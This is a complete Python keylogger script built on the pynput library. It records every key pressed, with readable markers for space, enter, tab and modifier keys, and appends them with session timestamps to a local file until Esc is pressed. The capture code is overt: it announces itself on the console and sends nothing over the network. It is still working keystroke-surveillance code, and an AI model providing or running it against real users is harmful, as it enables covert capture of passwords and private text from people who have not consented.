from pynput import keyboard
import time

# Define the log file path as a constant
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Handle standard alphanumeric keys
        with open(LOG_FILE, "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        # Handle special keys for better readability
        with open(LOG_FILE, "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.tab:
                log_file.write("\t")
            else:
                # Fallback for other special keys like Shift, Ctrl, etc.
                log_file.write(f" [{key}] ")

def on_release(key):
    # Stop the listener when 'Esc' is pressed
    if key == keyboard.Key.esc:
        print("\n[!] Exiting keylogger...")
        return False  # Returning False stops the pynput listener

if __name__ == "__main__":
    print("[*] Keylogger started. Press 'Esc' to stop.")
    
    # Add a timestamp to mark the beginning of a new session
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"\n\n--- Session Start: {time.ctime()} ---\n")

    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
